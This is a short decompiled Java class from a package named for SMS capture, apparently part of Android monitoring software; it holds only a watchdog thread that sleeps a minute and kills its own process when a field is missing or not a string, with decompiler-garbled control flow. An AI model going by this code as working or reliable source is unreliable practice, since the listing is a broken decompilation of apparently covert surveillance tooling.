package com.vvt.capture.sms;

import android.os.Process;
import android.os.SystemClock;

class d
  extends Thread
{
  d(c paramc) {}
  
  public void run()
  {
    long l = 60000L;
    SystemClock.sleep(l);
    Object localObject = c.a(this.a);
    if (localObject == null)
    {
      boolean bool1 = c.c();
      if (bool1) {}
      int i = Process.myPid();
      Process.killProcess(i);
    }
    for (;;)
    {
      return;
      localObject = c.a(this.a);
      boolean bool2 = localObject instanceof String;
      if (!bool2)
      {
        bool2 = c.c();
        if (bool2) {}
        int j = Process.myPid();
        Process.killProcess(j);
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */